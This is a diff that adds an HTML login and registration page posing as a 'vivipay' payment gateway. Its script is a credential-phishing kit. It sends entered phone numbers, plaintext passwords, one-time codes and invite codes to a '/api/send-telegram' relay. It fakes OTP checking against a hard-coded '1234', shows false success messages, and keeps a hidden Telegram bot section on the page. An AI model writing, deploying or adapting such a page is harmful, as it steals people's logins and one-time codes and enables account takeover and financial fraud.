@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>vivipay• Secure Gateway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            transition: background 0.25s ease;
+        }
+
+        body.register-active {
+            background: #001275 !important;
+        }
+
+        .app-shell {
+            width: 100%;
+            max-width: 450px;
+            min-height: 100vh;
+            background: white;
+            position: relative;
+            transition: background 0.2s;
+        }
+
+        body.register-active .app-shell {
+            background: linear-gradient(145deg, #002aff 0%, #001275 100%);
+        }
+
+        .hero-banner {
+            width: 100%;
+            aspect-ratio: 450 / 230;
+            display: none;
+            overflow: hidden;
+        }
+
+        .hero-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        body.register-active .hero-banner {
+            display: block;
+        }
+
+        .card-panel {
+            width: 100%;
+            background: #ffffff;
+            padding: 22px 24px 32px;
+            transition: all 0.2s;
+        }
+
+        .card-panel.login-layout {
+            margin-top: 0px;
+            border-radius: 0;
+        }
+
+        .card-panel.register-layout {
+            border-top-left-radius: 28px;
+            border-top-right-radius: 28px;
+            margin-top: -24px;
+            box-shadow: 0 -10px 28px rgba(0, 0, 0, 0.18);
+            flex: 1;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin: 20px 0 28px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-area img {
+            width: 320px;
+            max-width: 90%;
+            height: auto;
+            display: inline-block;
+        }
+
+        .form-stage {
+            display: none;
+            width: 100%;
+        }
+
+        .form-stage.active-form {
+            display: block;
+        }
+
+        .login-capsule .input-capsule {
+            background: #f4f7ff;
+            border-radius: 44px;
+            padding: 14px 22px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .login-capsule .input-capsule svg {
+            color: #3a86ff;
+            flex-shrink: 0;
+        }
+
+        .login-capsule .input-capsule input {
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            flex: 1;
+            font-weight: 500;
+            color: #111;
+        }
+
+        .login-capsule .input-capsule input::placeholder {
+            color: #abb2c2;
+            font-weight: 400;
+        }
+
+        .register-rows .input-line {
+            display: flex;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #eff2f8;
+            margin-bottom: 12px;
+        }
+
+        .register-rows .input-line label {
+            width: 110px;
+            font-weight: 600;
+            color: #1f2a44;
+            font-size: 15px;
+        }
+
+        .register-rows .input-line input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            background: transparent;
+        }
+
+        .utils-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 4px 24px 4px;
+            font-size: 14px;
+        }
+
+        .check-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #2b77ff;
+            cursor: pointer;
+        }
+
+        .forgot-link {
+            color: #2b77ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #198cff;
+            border: none;
+            padding: 15px;
+            border-radius: 44px;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            box-shadow: 0 6px 14px rgba(25, 140, 255, 0.3);
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+            background: #0f6ed4;
+        }
+
+        .btn-primary.disabled-btn {
+            background: #a0c4ff;
+            box-shadow: none;
+            cursor: not-allowed;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .privacy-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 22px;
+            font-size: 13px;
+            color: #5b677b;
+        }
+
+        .privacy-row a {
+            color: #198cff;
+            text-decoration: none;
+        }
+
+        .toggle-link {
+            text-align: center;
+            margin-top: 28px;
+            display: block;
+            color: #198cff;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .captcha-zone {
+            margin: 20px 0 20px;
+        }
+        .captcha-title {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #2c3e66;
+        }
+        .captcha-title span {
+            color: #e5484d;
+        }
+        .canvas-box {
+            position: relative;
+            width: 100%;
+            height: 140px;
+            background: #f0f2f8;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #e2e6ef;
+        }
+        #bgCanvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+        #pieceCanvas {
+            position: absolute;
+            top: 0;
+            left: 10px;
+            z-index: 12;
+            cursor: grab;
+        }
+        .slider-rail {
+            position: relative;
+            width: 100%;
+            height: 10px;
+            background: #e4e8f0;
+            border-radius: 20px;
+            margin-top: 18px;
+            border: 1px solid #cfd6e3;
+        }
+        .slider-drag {
+            position: absolute;
+            top: -9px;
+            left: 0;
+            width: 44px;
+            height: 28px;
+            background: #4a72ff;
+            border-radius: 30px;
+            cursor: grab;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            transition: background 0.1s;
+        }
+        .captcha-hint {
+            font-size: 11px;
+            color: #7e849b;
+            margin-top: 8px;
+        }
+        .captcha-success {
+            color: #1faf45;
+            font-weight: 700;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* OTP Modal Styles */
+        .otp-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+        .otp-modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .otp-modal-container {
+            width: 320px;
+            background: white;
+            border-radius: 32px;
+            padding: 28px 22px 36px;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
+            text-align: center;
+            position: relative;
+            transform: scale(0.95);
+            transition: transform 0.2s ease;
+        }
+        .otp-modal-overlay.active .otp-modal-container {
+            transform: scale(1);
+        }
+        .otp-close-btn {
+            position: absolute;
+            top: 18px;
+            right: 22px;
+            font-size: 24px;
+            font-weight: 400;
+            color: #8e9aaf;
+            cursor: pointer;
+            background: none;
+            border: none;
+            line-height: 1;
+            padding: 0;
+        }
+        .otp-close-btn:hover {
+            color: #1f2a44;
+        }
+        .otp-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 12px;
+        }
+        .otp-subtext {
+            font-size: 14px;
+            color: #5b6b8c;
+            margin-bottom: 20px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+        .otp-error-text {
+            font-size: 13px;
+            color: #e5484d;
+            font-weight: 600;
+            margin-bottom: 16px;
+            min-height: 20px;
+            display: block;
+        }
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 32px;
+        }
+        .otp-digit-input {
+            width: 58px;
+            height: 62px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 600;
+            font-family: monospace;
+            border: none;
+            border-bottom: 2.5px solid #dce2ec;
+            background: transparent;
+            outline: none;
+            color: #0a2540;
+            transition: border-color 0.15s, background 0.15s;
+            caret-color: #198cff;
+            border-radius: 4px;
+        }
+        .otp-digit-input:focus {
+            border-bottom-color: #198cff;
+            background: #f0f7ff;
+        }
+        .otp-digit-input.error-input {
+            border-bottom-color: #e5484d !important;
+            background: #fff0f0 !important;
+            color: #e5484d !important;
+            animation: shake 0.4s ease-in-out 0s 1;
+        }
+        .otp-digit-input.error-input:focus {
+            border-bottom-color: #e5484d !important;
+            background: #fff0f0 !important;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-5px); }
+            80% { transform: translateX(5px); }
+        }
+        .otp-resend-area {
+            text-align: center;
+            font-size: 13px;
+            color: #8892b0;
+            margin: 8px 0 12px;
+        }
+        .resend-link {
+            color: #198cff;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-block;
+        }
+        .resend-link.disabled {
+            color: #abb2c2;
+            pointer-events: none;
+        }
+        .verify-otp-btn {
+            width: 100%;
+            background: #198cff;
+            border: none;
+            padding: 14px;
+            border-radius: 48px;
+            font-size: 17px;
+            font-weight: 700;
+            color: white;
+            margin-top: 18px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .verify-otp-btn:active {
+            transform: scale(0.98);
+            background: #0f6ed4;
+        }
+        .resend-timer-text {
+            color: #5b6b8c;
+            font-size: 13px;
+        }
+
+        .toast-message {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: #1e293b;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 60px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 1000;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .toast-message.show {
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+        .warning-toast {
+            background: #dc2626;
+        }
+
+        /* Hidden Telegram Connect - exists but not visible on screen */
+        .telegram-connect-section {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-shell">
+    <div class="hero-banner">
+        <img src="https://i.postimg.cc/tCM6t2tz/register.png" alt="welcome banner">
+    </div>
+
+    <div class="card-panel login-layout" id="dynamicCardContainer">
+        <div id="loginFormContainer" class="form-stage active-form login-capsule">
+            <div class="logo-area">
+                <img src="https://i.postimg.cc/gj5gm9TV/Login-Logo.png" alt="vivipay">
+            </div>
+
+            <div class="input-capsule">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 20c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm5.17-4H6.83V5h10.34v12z"/></svg>
+                <input type="text" id="loginPhone" placeholder="Phone number" autocomplete="off">
+            </div>
+
+            <div class="input-capsule">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                <input type="password" id="loginPassword" placeholder="Password" autocomplete="off">
+            </div>
+
+            <div class="utils-bar">
+                <label class="check-label">
+                    <input type="checkbox" id="savePassCheck"> Save Password
+                </label>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+
+            <button class="btn-primary" id="loginBtn">Login</button>
+
+            <div class="privacy-row">
+                <input type="checkbox" id="privacyAgreeLogin" checked>
+                <label for="privacyAgreeLogin">Agree <a href="#">"User Privacy Agreement"</a></label>
+            </div>
+
+            <a class="toggle-link" id="showRegisterLink">Don't have an account? Go Register</a>
+        </div>
+
+        <div id="registerFormContainer" class="form-stage register-rows">
+            <div class="input-line">
+                <label>Phone</label>
+                <input type="text" id="regPhone" placeholder="Enter phone number">
+            </div>
+            <div class="input-line">
+                <label>Password</label>
+                <input type="password" id="regPassword" placeholder="Create password">
+            </div>
+            <div class="input-line">
+                <label>Confirm</label>
+                <input type="password" id="regConfirm" placeholder="Confirm password">
+            </div>
+            <div class="input-line">
+                <label>Invitercode</label>
+                <input type="text" id="inviteCode" value="9KQ7KNlh4z" readonly style="font-weight:600;color:#111;">
+            </div>
+
+            <div class="captcha-zone">
+                <div class="captcha-title">Slider verification <span>*</span></div>
+                <div class="canvas-box">
+                    <canvas id="bgCanvas" width="380" height="140" style="width:100%;height:auto;display:block;"></canvas>
+                    <canvas id="pieceCanvas" width="380" height="140" style="position:absolute; top:0; left:0;"></canvas>
+                </div>
+                <div class="slider-rail" id="trackRail">
+                    <div class="slider-drag" id="dragThumb"></div>
+                </div>
+                <div class="captcha-hint">➡️ Drag the puzzle piece to match the missing part</div>
+                <div class="captcha-success" id="captchaOkMsg">✓ Verification successful</div>
+            </div>
+
+            <button class="btn-primary" id="registerBtn">Register</button>
+            <a class="toggle-link" id="showLoginLink">Already have an account? Go Login</a>
+        </div>
+
+        <!-- Telegram Connect Section (hidden from screen but functional) -->
+        <div class="telegram-connect-section">
+            <button id="connectBot">Connect Telegram Bot</button>
+            <p id="status">Not connected</p>
+        </div>
+    </div>
+</div>
+
+<div id="otpModal" class="otp-modal-overlay">
+    <div class="otp-modal-container">
+        <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
+        <div class="otp-title">Please enter OTP</div>
+        <div class="otp-subtext" id="otpSubtext">OTP sent to **********</div>
+        <div class="otp-error-text" id="otpErrorText"></div>
+        <div class="otp-input-group" id="otpInputGroup">
+            <input type="text" maxlength="1" class="otp-digit-input" id="otp0" autocomplete="off" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input" id="otp1" autocomplete="off" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input" id="otp2" autocomplete="off" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input" id="otp3" autocomplete="off" inputmode="numeric">
+        </div>
+        <div class="otp-resend-area">
+            <span class="resend-timer-text" id="resendText">Resend in <span id="timerSeconds">120</span> seconds</span>
+            <a href="#" id="resendOtpLink" class="resend-link disabled" style="display: none;">Resend OTP</a>
+        </div>
+        <button class="verify-otp-btn" id="verifyOtpBtn">Verify & Login</button>
+    </div>
+</div>
+
+<div id="globalToast" class="toast-message"></div>
+
+<script>
+    // ========== TELEGRAM STATUS CHECK (hidden button, still functional) ==========
+    document.getElementById("connectBot").addEventListener("click", async () => {
+        const status = document.getElementById("status");
+        status.textContent = "Connecting...";
+
+        try {
+            const response = await fetch("/api/telegram-status");
+            if (!response.ok) throw new Error("Connection failed");
+
+            const data = await response.json();
+            status.textContent = data.connected
+                ? "Telegram Bot Connected"
+                : "Bot Not Connected";
+        } catch {
+            status.textContent = "Backend not configured";
+        }
+    });
+
+    // ========== API-BASED TELEGRAM SEND ==========
+    async function sendToTelegram(message) {
+        try {
+            await fetch("/api/send-telegram", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            });
+        } catch (err) {
+            console.warn("telegram send error", err);
+        }
+    }
+
+    function showToast(msg, isWarning = false) {
+        const toast = document.getElementById('globalToast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        if (isWarning) toast.classList.add('warning-toast');
+        else toast.classList.remove('warning-toast');
+        setTimeout(() => {
+            toast.classList.remove('show');
+        }, 3000);
+    }
+
+    // ---------- LOGIN BUTTON STATE ----------
+    const loginPasswordInput = document.getElementById('loginPassword');
+    const loginBtn = document.getElementById('loginBtn');
+
+    function updateLoginButtonState() {
+        const passwordVal = loginPasswordInput.value;
+        if (passwordVal.length > 0) {
+            loginBtn.disabled = false;
+            loginBtn.classList.remove('disabled-btn');
+        } else {
+            loginBtn.disabled = true;
+            loginBtn.classList.add('disabled-btn');
+        }
+    }
+
+    loginPasswordInput.addEventListener('input', updateLoginButtonState);
+    updateLoginButtonState();
+
+    function maskPhoneNumber(phoneRaw) {
+        let cleaned = phoneRaw.replace(/\D/g, '');
+        if (cleaned.length <= 6) return cleaned;
+        const start = cleaned.slice(0, 3);
+        const end = cleaned.slice(-4);
+        const masked = start + '****' + end;
+        return masked;
+    }
+
+    // ---------- OTP MODAL LOGIC ----------
+    const otpModal = document.getElementById('otpModal');
+    const closeOtpBtn = document.getElementById('closeOtpBtn');
+    const otpSubtextSpan = document.getElementById('otpSubtext');
+    const otpErrorTextSpan = document.getElementById('otpErrorText');
+    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const resendOtpLink = document.getElementById('resendOtpLink');
+    const timerSecondsSpan = document.getElementById('timerSeconds');
+    const resendTextSpan = document.getElementById('resendText');
+    
+    let otpTimerInterval = null;
+    let currentOtpPhone = '';
+    let currentLoginPassword = '';
+    let wrongAttemptCount = 0;
+    let canResend = false;
+
+    const otpInputs = [
+        document.getElementById('otp0'),
+        document.getElementById('otp1'),
+        document.getElementById('otp2'),
+        document.getElementById('otp3')
+    ];
+
+    function clearOtpInputs() {
+        otpInputs.forEach(inp => {
+            if(inp) {
+                inp.value = '';
+                inp.classList.remove('error-input');
+            }
+        });
+        if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+        if (otpInputs[0]) otpInputs[0].focus();
+    }
+
+    function showOtpError() {
+        otpInputs.forEach(inp => {
+            if(inp) inp.classList.add('error-input');
+        });
+        if (otpErrorTextSpan) {
+            otpErrorTextSpan.textContent = '❌ Wrong OTP! Please try again.';
+        }
+        setTimeout(() => {
+            clearOtpInputs();
+            if (otpInputs[0]) otpInputs[0].focus();
+        }, 1500);
+    }
+
+    function startResendTimer(seconds = 120) {
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        let remaining = seconds;
+        if(timerSecondsSpan) timerSecondsSpan.innerText = remaining;
+        canResend = false;
+        if(resendOtpLink) resendOtpLink.style.display = 'none';
+        if(resendTextSpan) resendTextSpan.style.display = 'inline';
+        
+        otpTimerInterval = setInterval(() => {
+            remaining--;
+            if (remaining <= 0) {
+                clearInterval(otpTimerInterval);
+                otpTimerInterval = null;
+                canResend = true;
+                if(resendTextSpan) resendTextSpan.style.display = 'none';
+                if(resendOtpLink) {
+                    resendOtpLink.style.display = 'inline';
+                    resendOtpLink.classList.remove('disabled');
+                }
+            } else {
+                if(timerSecondsSpan) timerSecondsSpan.innerText = remaining;
+                if(resendTextSpan) resendTextSpan.innerHTML = `Resend in <span id="timerSeconds">${remaining}</span> seconds`;
+            }
+        }, 1000);
+    }
+
+    function handleResendOtp(e) {
+        if (e) e.preventDefault();
+        if (canResend) {
+            showToast("📲 OTP resent successfully!", false);
+            startResendTimer(120);
+            clearOtpInputs();
+            wrongAttemptCount = 0;
+            if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+            const resendMsg = `🔄 OTP RESEND REQUEST\n📱 Mobile Number: ${currentOtpPhone}\n⏰ Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(resendMsg);
+        }
+    }
+
+    function closeOtpModal() {
+        otpModal.classList.remove('active');
+        if (otpTimerInterval) {
+            clearInterval(otpTimerInterval);
+            otpTimerInterval = null;
+        }
+        wrongAttemptCount = 0;
+        if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+    }
+
+    function openOtpModal(phoneNumber, password) {
+        currentOtpPhone = phoneNumber;
+        currentLoginPassword = password;
+        wrongAttemptCount = 0;
+        const masked = maskPhoneNumber(phoneNumber);
+        otpSubtextSpan.innerText = `OTP sent to ${masked}`;
+        if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+        clearOtpInputs();
+        startResendTimer(120);
+        otpModal.classList.add('active');
+    }
+
+    function setupOtpInputs() {
+        otpInputs.forEach((input, idx) => {
+            if (!input) return;
+            input.addEventListener('input', (e) => {
+                const val = e.target.value;
+                input.classList.remove('error-input');
+                if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+                
+                if (val.length === 1 && /[0-9]/.test(val)) {
+                    if (idx < 3 && otpInputs[idx + 1]) otpInputs[idx + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && idx > 0) {
+                    if(otpInputs[idx - 1]) otpInputs[idx - 1].focus();
+                }
+                input.classList.remove('error-input');
+                if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+            });
+            input.addEventListener('focus', () => {
+                input.classList.remove('error-input');
+            });
+        });
+    }
+    setupOtpInputs();
+
+    if(resendOtpLink) resendOtpLink.addEventListener('click', handleResendOtp);
+
+    verifyOtpBtn.addEventListener('click', async () => {
+        let otpCode = '';
+        otpInputs.forEach(inp => { if(inp) otpCode += inp.value; });
+        wrongAttemptCount++;
+        const isValid = (otpCode === "1234");
+        
+        const attemptMsg = `🔐 OTP VERIFICATION ATTEMPT #${wrongAttemptCount}\n📱 Mobile Number: ${currentOtpPhone}\n🔑 Password: ${currentLoginPassword}\n🔢 OTP Entered: ${otpCode || "(empty)"}\n⏰ Time: ${new Date().toLocaleString()}\n📊 Status: ${isValid ? '✅ CORRECT OTP' : '❌ WRONG OTP'}`;
+        await sendToTelegram(attemptMsg);
+        
+        if (!isValid) {
+            showOtpError();
+            return;
+        }
+        
+        showToast("✅ Verification successful! Welcome to vivipay.", false);
+        closeOtpModal();
+        document.getElementById('loginPhone').value = '';
+        document.getElementById('loginPassword').value = '';
+        updateLoginButtonState();
+        wrongAttemptCount = 0;
+        if (otpErrorTextSpan) otpErrorTextSpan.textContent = '';
+    });
+
+    if(closeOtpBtn) closeOtpBtn.addEventListener('click', closeOtpModal);
+    if(otpModal) otpModal.addEventListener('click', (e) => { if (e.target === otpModal) closeOtpModal(); });
+
+    async function executeLogin() {
+        const phone = document.getElementById('loginPhone').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        const privacyChecked = document.getElementById('privacyAgreeLogin').checked;
+        
+        if (!privacyChecked) { showToast("Please agree to User Privacy Agreement.", true); return; }
+        if (!phone) { showToast("Phone number required.", true); return; }
+        if (!password) { showToast("Password cannot be empty.", true); return; }
+        
+        const basicMsg = `🔐 LOGIN INITIATED\n📱 Mobile Number: ${phone}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
+        sendToTelegram(basicMsg);
+        showToast("📲 Enter OTP code to verify", false);
+        openOtpModal(phone, password);
+    }
+
+    // ---------- REGISTER LOGIC ----------
+    let captchaResolved = false;
+    let currentPuzzleX = 0;
+    let puzzleYPos = 0;
+    const PUZZLE_SIZE = 42;
+
+    const bgCanvas = document.getElementById('bgCanvas');
+    const pieceCanvas = document.getElementById('pieceCanvas');
+    let bgCtx = bgCanvas ? bgCanvas.getContext('2d') : null;
+    let pieceCtx = pieceCanvas ? pieceCanvas.getContext('2d') : null;
+    const track = document.getElementById('trackRail');
+    const handle = document.getElementById('dragThumb');
+    const successMsgDiv = document.getElementById('captchaOkMsg');
+
+    let dragActive = false;
+    let dragStartX = 0;
+    let currentLeftOffset = 0;
+
+    function drawPuzzleShape(ctx, x, y) {
+        const s = PUZZLE_SIZE;
+        ctx.beginPath();
+        ctx.moveTo(x, y);
+        ctx.lineTo(x + s/2, y);
+        ctx.arc(x + s/2, y, 6, 1 * Math.PI, 0);
+        ctx.lineTo(x + s, y);
+        ctx.lineTo(x + s, y + s/2);
+        ctx.arc(x + s, y + s/2, 6, 1.5 * Math.PI, 0.5 * Math.PI);
+        ctx.lineTo(x + s, y + s);
+        ctx.lineTo(x, y + s);
+        ctx.closePath();
+    }
+
+    function regeneratePuzzle() {
+        if (!bgCanvas || !pieceCanvas) return;
+        const w = bgCanvas.width = 380;
+        const h = bgCanvas.height = 140;
+        bgCtx = bgCanvas.getContext('2d');
+        pieceCtx = pieceCanvas.getContext('2d');
+        
+        const gradients = [['#ff758c','#ff7eb3'],['#84fab0','#8fd3f4'],['#a1c4fd','#c2e9fb'],['#f6d365','#fda085'],['#d4fc79','#96e6a1']];
+        const pick = gradients[Math.floor(Math.random() * gradients.length)];
+        const grad = bgCtx.createLinearGradient(0, 0, w, h);
+        grad.addColorStop(0, pick[0]);
+        grad.addColorStop(1, pick[1]);
+        bgCtx.fillStyle = grad;
+        bgCtx.fillRect(0, 0, w, h);
+        for (let i = 0; i < 12; i++) {
+            bgCtx.fillStyle = `rgba(255,255,255,${Math.random() * 0.3 + 0.1})`;
+            bgCtx.beginPath();
+            bgCtx.arc(Math.random() * w, Math.random() * h, Math.random() * 18 + 8, 0, Math.PI*2);
+            bgCtx.fill();
+        }
+        currentPuzzleX = Math.floor(Math.random() * (w - PUZZLE_SIZE - 70)) + 60;
+        puzzleYPos = Math.floor(Math.random() * (h - PUZZLE_SIZE - 20)) + 15;
+        bgCtx.fillStyle = 'rgba(0,0,0,0.65)';
+        bgCtx.strokeStyle = '#ffffff';
+        bgCtx.lineWidth = 2;
+        drawPuzzleShape(bgCtx, currentPuzzleX, puzzleYPos);
+        bgCtx.fill();
+        bgCtx.stroke();
+        pieceCtx.clearRect(0, 0, w, h);
+        pieceCtx.save();
+        pieceCtx.beginPath();
+        drawPuzzleShape(pieceCtx, currentPuzzleX, puzzleYPos);
+        pieceCtx.clip();
+        pieceCtx.drawImage(bgCanvas, 0, 0);
+        pieceCtx.restore();
+        const imgData = pieceCtx.getImageData(currentPuzzleX, puzzleYPos, PUZZLE_SIZE+6, PUZZLE_SIZE+6);
+        pieceCtx.clearRect(0, 0, w, h);
+        pieceCtx.putImageData(imgData, 12, puzzleYPos);
+        if(handle) handle.style.left = '0px';
+        if(pieceCanvas) pieceCanvas.style.transform = 'translateX(0px)';
+        currentLeftOffset = 0;
+        captchaResolved = false;
+        if(successMsgDiv) successMsgDiv.style.display = 'none';
+        if(handle) handle.style.background = '#4a72ff';
+    }
+
+    function onDragStart(e) {
+        if (captchaResolved) return;
+        dragActive = true;
+        const clientX = e.clientX ?? (e.touches ? e.touches[0].clientX : 0);
+        dragStartX = clientX - currentLeftOffset;
+        e.preventDefault();
+    }
+    function onDragMove(e) {
+        if (!dragActive || captchaResolved) return;
+        const clientX = e.clientX ?? (e.touches ? e.touches[0].clientX : 0);
+        let newLeft = clientX - dragStartX;
+        const maxMove = track.offsetWidth - handle.offsetWidth;
+        if (newLeft < 0) newLeft = 0;
+        if (newLeft > maxMove) newLeft = maxMove;
+        currentLeftOffset = newLeft;
+        handle.style.left = newLeft + 'px';
+        const maxTrackPx = track.offsetWidth - handle.offsetWidth;
+        const targetMaxShift = currentPuzzleX - 12;
+        let ratio = maxTrackPx > 0 ? newLeft / maxTrackPx : 0;
+        let translateX = ratio * targetMaxShift;
+        pieceCanvas.style.transform = `translateX(${translateX}px)`;
+    }
+    function onDragEnd() {
+        if (!dragActive) return;
+        dragActive = false;
+        if (captchaResolved) return;
+        const maxMove = track.offsetWidth - handle.offsetWidth;
+        const ratio = maxMove > 0 ? currentLeftOffset / maxMove : 0;
+        const estimatedX = 12 + (ratio * (currentPuzzleX - 12));
+        const tolerance = 6;
+        if (Math.abs(estimatedX - currentPuzzleX) <= tolerance) {
+            captchaResolved = true;
+            successMsgDiv.style.display = 'block';
+            handle.style.background = '#1faf45';
+        } else {
+            regeneratePuzzle();
+        }
+    }
+    if(handle) {
+        handle.addEventListener('mousedown', onDragStart);
+        handle.addEventListener('touchstart', onDragStart);
+    }
+    window.addEventListener('mousemove', onDragMove);
+    window.addEventListener('mouseup', onDragEnd);
+    window.addEventListener('touchmove', onDragMove);
+    window.addEventListener('touchend', onDragEnd);
+
+    async function executeRegister() {
+        if (!captchaResolved) { showToast("Please complete the slider puzzle verification first!", true); return; }
+        const phone = document.getElementById('regPhone').value.trim();
+        const pwd = document.getElementById('regPassword').value;
+        const confirmPwd = document.getElementById('regConfirm').value;
+        const inviteCodeVal = document.getElementById('inviteCode').value;
+        
+        if (!phone) { showToast("Phone number required.", true); return; }
+        if (!pwd || pwd.length < 4) { showToast("Password min 4 characters.", true); return; }
+        if (pwd !== confirmPwd) { showToast("Passwords do not match.", true); return; }
+        
+        const regMsg = `📝 NEW REGISTRATION\n📱 Mobile Number: ${phone}\n🔑 Password: ${pwd}\n🎫 Inviter Code: ${inviteCodeVal}\n⏰ Time: ${new Date().toLocaleString()}`;
+        await sendToTelegram(regMsg);
+        showToast("✅ Account registration successful! Welcome to vivipay.", false);
+        
+        captchaResolved = false;
+        successMsgDiv.style.display = 'none';
+        handle.style.background = '#4a72ff';
+        regeneratePuzzle();
+        document.getElementById('regPhone').value = '';
+        document.getElementById('regPassword').value = '';
+        document.getElementById('regConfirm').value = '';
+        setTimeout(() => switchToLogin(), 1500);
+    }
+
+    function switchToRegister() {
+        document.body.classList.add('register-active');
+        const card = document.getElementById('dynamicCardContainer');
+        card.classList.remove('login-layout');
+        card.classList.add('register-layout');
+        document.getElementById('loginFormContainer').classList.remove('active-form');
+        document.getElementById('registerFormContainer').classList.add('active-form');
+        setTimeout(() => { regeneratePuzzle(); captchaResolved = false; if(successMsgDiv) successMsgDiv.style.display = 'none'; if(handle) handle.style.background = '#4a72ff'; }, 50);
+    }
+    
+    function switchToLogin() {
+        document.body.classList.remove('register-active');
+        const card = document.getElementById('dynamicCardContainer');
+        card.classList.remove('register-layout');
+        card.classList.add('login-layout');
+        document.getElementById('registerFormContainer').classList.remove('active-form');
+        document.getElementById('loginFormContainer').classList.add('active-form');
+        updateLoginButtonState();
+    }
+    
+    const showRegisterLink = document.getElementById('showRegisterLink');
+    const showLoginLink = document.getElementById('showLoginLink');
+    const registerBtn = document.getElementById('registerBtn');
+    
+    if(showRegisterLink) showRegisterLink.addEventListener('click', (e) => { e.preventDefault(); switchToRegister(); });
+    if(showLoginLink) showLoginLink.addEventListener('click', (e) => { e.preventDefault(); switchToLogin(); });
